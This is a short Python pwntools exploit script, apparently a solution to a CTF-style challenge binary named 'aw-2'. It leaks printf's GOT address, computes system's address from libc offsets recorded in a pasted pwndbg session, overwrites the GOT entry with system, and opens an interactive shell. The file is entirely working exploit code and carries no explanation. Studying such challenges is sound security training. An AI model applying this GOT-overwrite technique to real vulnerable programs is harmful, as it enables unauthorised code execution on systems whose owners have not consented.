#!/usr/bin/env python

from pwn import *
env = {
        'PATH': '.'
        }
p = process("./aw-2", env=env)

printf_got = p.elf.got['printf']

print(p.recv())
p.sendline("8")

print(p.recv())
p.sendline(hex(printf_got))

data = p.recv()
print(repr(data))

printf_addr = u64(data.split('\n')[1][0:8])
print(hex(printf_addr))

"""
pwndbg> print printf
$3 = {<text variable, no debug info>} 0x7ffff7a62800 <__printf>
pwndbg> print system
$4 = {<text variable, no debug info>} 0x7ffff7a52390 <__libc_system>
"""

system_addr = printf_addr - 0x7ffff7a62800 + 0x7ffff7a52390

p.sendline("8")

print(p.recv())
p.sendline(hex(printf_got))

p.send(p64(system_addr))
p.interactive()
